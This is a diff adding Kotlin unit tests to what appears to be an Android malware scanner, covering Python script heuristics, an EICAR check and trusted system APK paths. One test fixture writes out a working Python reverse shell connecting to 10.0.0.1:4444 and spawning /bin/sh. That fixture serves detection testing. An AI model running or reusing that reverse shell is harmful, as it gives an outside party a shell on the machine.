@@ -31,7 +31,7 @@ class DetectorHeuristicsTest {
 
     private val localDetectors = listOf(
         PrefilterDetector(), DocumentAnalyzer(), EntropyDetector(),
-        StringIocDetector(), PeAnalyzer(), ScriptAnalyzer()
+        StringIocDetector(), PeAnalyzer(), PythonAnalyzer(), ScriptAnalyzer()
     )
 
     private fun target(name: String, bytes: ByteArray): ScanTarget {
@@ -171,6 +171,58 @@ class DetectorHeuristicsTest {
     }
 
     @Test
+    fun `python script with network and exec is warning not threat`() {
+        val script = """
+            import requests
+            import subprocess
+
+            r = requests.get("http://example.com/api")
+            subprocess.run(["echo", "merhaba"])
+        """.trimIndent()
+        val findings = inspectAll(target("arac.py", script.toByteArray()))
+        val (score, verdict) = RiskScorer.evaluate(findings)
+        assertEquals(Verdict.CLEAN, verdict)
+        assertEquals("Uyarılar skoru artırmamalı", 0, score)
+        assertTrue("Python betiği uyarısı görünmeli: ${findings.map { it.ruleId }}",
+            findings.any { it.ruleId == "PY_SCRIPT" })
+        assertTrue("Ağ davranışı uyarısı görünmeli: ${findings.map { it.ruleId }}",
+            findings.any { it.ruleId == "PY_NETWORK" })
+        assertTrue("Komut davranışı uyarısı görünmeli: ${findings.map { it.ruleId }}",
+            findings.any { it.ruleId == "PY_EXEC" })
+        assertTrue("Python bulguları yalnızca uyarı olmalı",
+            findings.all { it.warningOnly })
+    }
+
+    @Test
+    fun `python reverse shell stays a warning`() {
+        val script = """
+            import socket, os, pty
+            s = socket.socket()
+            s.connect(("10.0.0.1", 4444))
+            os.dup2(s.fileno(), 0)
+            pty.spawn("/bin/sh")
+        """.trimIndent()
+        val findings = inspectAll(target("test_araci.py", script.toByteArray()))
+        val (score, verdict) = RiskScorer.evaluate(findings)
+        assertEquals(Verdict.CLEAN, verdict)
+        assertEquals(0, score)
+        assertTrue("Ters kabuk uyarısı görünmeli: ${findings.map { it.ruleId }}",
+            findings.any { it.ruleId == "PY_REVERSE_SHELL" })
+    }
+
+    @Test
+    fun `python file with eicar is still a threat`() {
+        val eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}" +
+            "\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!\$H+H*"
+        val script = "print('test')\n// $eicar\n"
+        val findings = inspectAll(target("test.py", script.toByteArray()))
+        val (_, verdict) = RiskScorer.evaluate(findings)
+        assertTrue("EICAR Python içinde de tehdit olmalı: ${findings.map { it.ruleId }}",
+            findings.any { it.ruleId == "EICAR_TEST" })
+        assertEquals(Verdict.DANGEROUS, verdict)
+    }
+
+    @Test
     fun `apk container is not flagged for high entropy`() {
         val random = ByteArray(512 * 1024)
         java.util.Random(42).nextBytes(random)
@@ -214,5 +266,15 @@ class DetectorHeuristicsTest {
         assertTrue(ScanPolicy.shouldSkipFile(".0.jpg"))
         assertFalse(ScanPolicy.shouldSkipFile("foto.jpg"))
         assertFalse(ScanPolicy.shouldSkipDirectory("/storage/emulated/0/Download", "Download"))
+    }
+
+    @Test
+    fun `system partition apks are trusted`() {
+        assertTrue(ScanPolicy.isTrustedSystemApk("/system/priv-app/Settings/Settings.apk"))
+        assertTrue(ScanPolicy.isTrustedSystemApk("/product/app/Foo/Foo.apk"))
+        assertTrue(ScanPolicy.isTrustedSystemApk("/apex/com.android.foo/Foo.apk"))
+        assertFalse(ScanPolicy.isTrustedSystemApk("/data/app/~~abc/Foo/base.apk"))
+        assertFalse(ScanPolicy.isTrustedSystemApk("/system/etc/hosts"))
+        assertFalse(ScanPolicy.isTrustedSystemApk("/storage/emulated/0/Download/Foo.apk"))
     }
 }
